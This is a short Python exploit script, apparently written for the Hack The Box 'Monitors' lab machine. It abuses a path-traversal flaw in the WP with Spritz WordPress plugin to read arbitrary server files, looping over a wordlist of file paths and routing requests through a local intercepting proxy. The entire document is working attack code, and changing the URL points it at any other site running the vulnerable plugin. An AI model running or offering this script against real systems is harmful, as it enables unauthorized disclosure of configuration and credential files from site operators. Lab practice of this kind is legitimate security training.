#!/usr/bin/python3
import requests
import sys

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1'}


def remote_file_read(line):
    url = "http://monitors.htb"
    path = "/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../"
    r = requests.get(url + path + line, proxies=proxies)
    print(r.text, end="")


if __name__ == "__main__":
    try:
        file = sys.argv[1].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <file>")
        print(f"[-] Example: {sys.argv[0]} apache.txt")
        sys.exit(-1)

    fobj = open(file, "r")
    for line in fobj:
        print(f"[-] Testing {line}")
        remote_file_read(line[:-1])
    fobj.close()
